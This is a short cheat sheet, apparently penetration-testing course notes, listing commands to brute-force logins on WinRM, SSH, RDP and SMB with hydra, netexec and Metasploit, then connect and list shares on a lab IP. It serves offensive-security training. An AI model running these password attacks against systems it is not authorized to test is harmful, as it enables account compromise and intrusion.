---
title: Network Service Cracking
tags: [hash, password, cracking]
service: ['winrm', 'ssh', 'rdp', 'smb', 'windows']
tools: ['john', 'hashcat', 'hasid', 'netexec', 'hydra']
---

# Network Service Cracking

Tools:

`````
sudo apt-get -y install netexec
sudo gem install evil-winrm
`````

## WinRM - NetExec

```shell-session
netexec winrm 10.129.42.197 -u user.list -p password.list

evil-winrm -i 10.129.42.197 -u user -p password
```

## SSH - Hydra

```shell-session
hydra -L user.list -P password.list ssh://10.129.42.197

ssh user@10.129.42.197
```

## RDP - Hydra

`````
hydra -L user.list -P password.list rdp://10.129.42.197

xfreerdp /v:10.129.42.197 /u:user /p:password
`````

## SMB - Hydra or Metasploit

`````
# Hydra cracking
hydra -L user.list -P password.list smb://10.129.42.197

# Metasploit password cracking
msf6 > use auxiliary/scanner/smb/smb_login
# Options
set user_file user.list
set pass_file password.list

# View available shares
netexec smb 10.129.42.197 -u "user" -p "password" --shares

# View the share
smbclient -U user \\\\10.129.42.197\\SHARENAME
`````
